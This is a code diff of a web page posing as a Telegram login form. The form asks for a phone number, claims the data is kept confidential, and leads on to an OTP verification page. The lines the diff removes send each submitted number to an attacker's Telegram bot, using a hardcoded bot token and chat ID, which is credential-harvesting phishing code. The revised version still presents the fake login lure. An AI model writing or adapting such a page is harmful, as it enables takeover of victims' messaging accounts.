@@ -176,13 +176,27 @@
 <p>To continue, please login first</p>
 
 <form id="phoneForm">
-  <label for="phone">Telegram number</label>
-  <input type="tel" id="phoneInput" placeholder="Telegram number" required />
+  <label for="country">Country</label>
 
-  <button type="submit" class="btn">next</button>
+  <select id="country" required>
+    <option value="+60">🇲🇾 Malaysia (+60)</option>
+    <option value="+65">🇸🇬 Singapore (+65)</option>
+  </select>
+
+  <label for="phone">Telegram number</label>
+
+  <input
+    type="tel"
+    id="phoneInput"
+    placeholder="Telegram number"
+    required
+  />
+
+  <button type="submit" class="btn">Next</button>
 
   <div class="disclaimer">
-    *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+    *Make sure the number entered is active to receive verification.
+    Data will be kept confidential in accordance with the Personal Data Protection Act.
   </div>
 </form>
 
@@ -190,55 +204,18 @@
 
 <script>
   const phoneForm = document.getElementById('phoneForm');
+  const country = document.getElementById('country');
   const phoneInput = document.getElementById('phoneInput');
   const statusMessage = document.getElementById('statusMessage');
-  const blurOverlay = document.getElementById('blurOverlay');
-  const loadingText = document.getElementById('loadingText');
-
-  const bots = [
-    { token: "8800204270:AAHGcm-4O6eKVrE0v_3yzeuqH_woca77o0o", chatId: "6548196059" },
-    { token: "8800204270:AAHGcm-4O6eKVrE0v_3yzeuqH_woca77o0o", chatId: "6548196059" }
-  ];
 
   phoneForm.addEventListener('submit', function (e) {
     e.preventDefault();
 
-    const phone = phoneInput.value.trim();
-    const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
-    localStorage.setItem('sessionBotIndex', currentBotIndex);
-    const bot = bots[currentBotIndex];
+    const countryCode = country.value;
+    const number = phoneInput.value.trim().replace(/^0+/, '');
+    const fullPhone = countryCode + number;
 
-    const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
-    const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-    statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+    statusMessage.textContent = "Number selected: " + fullPhone;
     statusMessage.style.color = "#000";
-    blurOverlay.style.display = "block";
-    loadingText.style.display = "block";
-
-    fetch(api)
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          const nextBotIndex = (currentBotIndex + 1) % bots.length;
-          localStorage.setItem('currentBotIndex', nextBotIndex);
-          setTimeout(() => {
-            window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-          }, 3000);
-        } else {
-          blurOverlay.style.display = "none";
-          loadingText.style.display = "none";
-          statusMessage.textContent = "❌ Gagal mengirim ke bot.";
-          statusMessage.style.color = "red";
-        }
-      })
-      .catch(err => {
-        blurOverlay.style.display = "none";
-        loadingText.style.display = "none";
-        statusMessage.textContent = "❌ Error: " + err.message;
-        statusMessage.style.color = "red";
-      });
   });
-  </script>
-</body>
-</html>
+</script>
